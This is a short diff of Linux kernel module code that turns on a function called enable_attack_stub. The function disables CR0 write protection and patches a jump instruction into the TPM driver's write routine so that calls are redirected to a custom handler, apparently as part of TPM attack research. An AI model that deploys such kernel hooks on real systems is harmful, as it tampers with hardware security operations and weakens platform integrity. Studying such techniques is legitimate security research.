@@ -80,22 +80,21 @@ unsigned long long requestcnt = 0;
 
 static void enable_attack_stub()
 {
-  printk("TPMTTL: ENABLED 111\n");
   requestcnt = 0;
-  unsigned long flags;
+  // unsigned long flags;
   unsigned int target_addr;
-  local_irq_save(flags);
-  write_cr0 (read_cr0 () & (~ 0x10000));
+  // local_irq_save(flags);
+  write_cr0(read_cr0() & (~X86_CR0_WP));
 
-  // target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
-  // jmp_stub[1] = ((char*)&target_addr)[0];
-  // jmp_stub[2] = ((char*)&target_addr)[1];
-  // jmp_stub[3] = ((char*)&target_addr)[2];
-  // jmp_stub[4] = ((char*)&target_addr)[3];
-  // memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
+  target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
+  jmp_stub[1] = ((char*)&target_addr)[0];
+  jmp_stub[2] = ((char*)&target_addr)[1];
+  jmp_stub[3] = ((char*)&target_addr)[2];
+  jmp_stub[4] = ((char*)&target_addr)[3];
+  memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
 
-  write_cr0 (read_cr0 () | 0x10000);
-  local_irq_restore(flags);
+  write_cr0(read_cr0() | X86_CR0_WP); 
+  // local_irq_restore(flags);
  
   printk("TPMTTL: ENABLED\n");
 }
